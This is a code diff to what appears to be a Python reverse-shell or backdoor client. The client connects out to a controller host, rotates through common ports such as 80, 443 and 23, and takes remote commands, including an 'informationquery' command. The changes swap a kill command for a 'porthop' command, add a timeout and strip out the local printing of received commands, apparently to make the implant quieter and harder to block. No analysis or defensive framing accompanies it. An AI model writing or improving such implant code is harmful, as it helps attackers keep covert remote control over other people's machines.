@@ -9,7 +9,7 @@ ports = [80, 8080, 443, 20, 21, 23]
 PORT = ports[0]
 BUFFER = 1024
 
-KILLSTRING = "endme"
+HOP_STRING = "porthop"
 INFO_QUERY = "informationquery"
 
 def nextPort(p):
@@ -32,19 +32,18 @@ while True:
 	try:
 		if not open_conn:
 			s = socket.socket()
+			s.settimeout(10)
 			print("Trying to connect")
 			s.connect((HOST, PORT))
+			PORT = nextPort(PORT)
 			print("Connected")
 			open_conn = True
 			
 		cmd = s.recv(BUFFER).decode()
-		print("Received: " + cmd)
 		
-		if cmd == KILLSTRING:
-			print("Ending session")
+		if cmd == HOP_STRING:
 			open_conn = False
 			s.close()
-			PORT = nextPort(PORT)
 			time.sleep(1)
 		else:
 			if cmd == INFO_QUERY:
